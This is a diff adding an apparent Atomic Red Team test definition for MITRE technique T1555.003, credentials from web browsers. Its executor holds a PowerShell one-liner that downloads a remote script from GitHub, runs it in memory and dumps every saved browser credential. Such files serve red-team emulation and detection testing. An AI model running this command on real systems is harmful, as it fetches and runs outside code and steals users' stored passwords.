@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
+    "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
